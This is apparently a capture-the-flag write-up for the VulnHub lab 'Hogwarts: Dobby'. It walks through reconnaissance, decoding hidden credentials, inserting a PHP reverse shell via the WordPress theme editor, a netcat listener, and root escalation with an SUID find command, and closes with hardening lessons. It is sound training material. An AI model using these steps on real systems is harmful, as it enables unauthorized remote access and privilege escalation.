# Hogwarts: Dobby

**Platform:** VulnHub | **Difficulty:** Beginner | **Date:** March. 2026

> [VulnHub page](https://www.vulnhub.com/entry/hogwarts-dobby,597/)

## 1. Reconnaissance

Identify the target on the local network, then enumerate open ports and services.

```bash
nmap -sn 10.0.2.0/24
nmap -sCV -p- 10.0.2.8
```

**Observed:**

```
Nmap scan report for dobby (10.0.2.8)
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==
```

Only one port is open: **80** (HTTP). The page title itself hides a Base64-encoded message:

```
dG9vIGVhc3kgbm8/IFBvdHRlcg==  ->  "too easy no? Potter"
```

A first taste of this box's style: clues are hidden in plain sight, encoded rather than protected.

## 2. Enumeration

### Page source and hidden hints

Viewing the page source of the homepage reveals an HTML comment pointing to a hidden path:

```html
<!--
     See: /alohomora
  -->
```

Visiting `/alohomora` gives a direct hint about a password:

```
Draco's password is his house ;)
```

Draco Malfoy's Hogwarts house is **Slytherin** — so his password is likely `slytherin`, to be tried later.

### Directory brute-forcing

```bash
gobuster dir -u http://dobby -w /usr/share/wordlists/dirb/common.txt
```

```
index.html           (Status: 200)
log                  (Status: 200)
phpinfo.php          (Status: 200)
```

### Following the trail of clues

`/log` contains a Base64-encoded string:

```
pass:OjppbGlrZXNvY2tz   ->  decoded: ::ilikesocks
```

This decodes to a password, `ilikesocks`, to keep for later — and another hint pointing to `/DiagonAlley`.

`/DiagonAlley/index.php/2020/11/07/dobby/` contains a blog post written in **Brainfuck**, an esoteric programming language where every character is an operator rather than readable text. Running the snippet through a Brainfuck interpreter decodes part of a hidden message.

`/DiagonAlley/` itself turns out to be a **WordPress** site. Logging in with the credentials guessed earlier from the house hint:

```
draco : slytherin
```

successfully authenticates into the WordPress admin dashboard.

## 3. Exploitation

The WordPress account has access to the **theme editor** (Appearance → Theme Editor), which lets an authenticated user directly edit PHP files served by the site. This is a well-known WordPress privilege escalation path: editing a theme file to include a PHP reverse shell payload turns a simple admin login into full remote code execution, since the edited file is executed server-side on the next page load.

After inserting a PHP reverse shell payload (e.g. a `pentestmonkey`-style one-liner pointing back to the attacker's IP/port) into a theme file and saving it, a listener is started on the attacking machine:

```bash
nc -nvlp 8888
```

Triggering the modified page returns a shell:

```
listening on [any] 8888 ...
connect to [10.0.2.12] from (UNKNOWN) [10.0.2.8] 45576
Linux HogWarts 5.8.0-26-generic #27-Ubuntu SMP Wed Oct 21 22:29:16 UTC 2020 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is stabilized for proper interactivity:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Flag 1

```bash
www-data@HogWarts:/home/dobby$ ls
Descargas   Escritorio  Música      Público  flag1.txt
Documentos  Imágenes    Plantillas  Vídeos   sudoers
```

`cat` isn't available on this minimal install, so `vi` is used instead to read the file:

```bash
www-data@HogWarts:/home/dobby$ vi flag1.txt
```

```
Harry potter this year should not go to the school of wizardry

flag1{28327a4964cb391d74111a185a5047ad}
```

### Switching to the dobby user

The password recovered earlier from the `/log` page (`ilikesocks`) is used to switch to the box's named user:

```bash
www-data@HogWarts:/home/dobby$ su dobby
Password: ilikesocks
```

## 4. Privilege Escalation

```bash
dobby@HogWarts:/tmp$ sudo -l
[sudo] contraseña para dobby: ilikesocks
Lo sentimos, el usuario dobby no puede ejecutar sudo en HogWarts.
```

`dobby` has no `sudo` rights at all, so the escalation path has to come from somewhere else — a classic check is for SUID binaries (executables that run with their owner's privileges rather than the invoking user's):

```bash
find / -perm -4000 2>/dev/null
```

As with DC-1, `/usr/bin/find` itself is set SUID, which is directly exploitable through `find`'s `-exec` option:

```bash
dobby@HogWarts:/tmp$ find . -exec /bin/bash -p \; -quit
bash-5.0# whoami
root
```

### Final flag

```bash
bash-5.0# cd /root
bash-5.0# ls
proof.txt  snap
bash-5.0# vi proof.txt
```

```
                                                                 
        ___                             | '  \
   ___  \ /  ___         ,'\_           | .-. \        /|
   \ /  | |,'__ \  ,'\_  |   \          | | | |      ,' |_   /|
 _ | |  | |\/  \ \ |   \ | |\_|    _    | |_| |   _ '-. .-',' |_   _
// | |  | |____| | | |\_|| |__    //    |     | ,'_`. | | '-. .-',' `. ,'\_
\\_| |_,' .-, _  | | |   | |\ \  //    .| |\_/ | / \ || |   | | / |\  \|   \
 `-. .-'| |/ / | | | |   | | \ \//     |  |    | | | || |   | | | |_\ || |\_|
   | |  | || \_| | | |   /_\  \ /      | |`    | | | || |   | | | .---'| |
   | |  | |\___,_\ /_\ _      //       | |     | \_/ || |   | | | |  /\| |
   /_\  | |           //_____//       .||`      `._,' | |   | | \ `-' /| |
        /_\           `------'        \ |   AND        `.\  | |  `._,' /_\
                                       \|       THE          `.\
                                            _  _  _  _  __ _  __ _ /_
                                           (_`/ \|_)/ '|_ |_)|_ |_)(_
                                           ._)\_/| \\_,|__| \|__| \ _)
                                                           _ ___ _      _
                                                          (_` | / \|\ ||__
                                                          ._) | \_/| \||___



root{63a9f0ea7bb98050796b649e85481845!!}
```

## 5. Lessons Learned
- Allowing untrusted or low-trust accounts access to WordPress's **theme/plugin editor** is equivalent to granting them remote code execution — this feature should be disabled in production (`DISALLOW_FILE_EDIT` in `wp-config.php`) and access should be restricted to fully trusted administrators only.
- SUID should never be set on general-purpose binaries (`find`, `vim`, `less`, `cp`, ...) — see [GTFOBins](https://gtfobins.github.io/) for the full list of abusable binaries.
- **Fix:** before going to production, disable the WordPress file editor, update WordPress and its theme, and remove the SUID bit from `find` (`chmod u-s /usr/bin/find`).
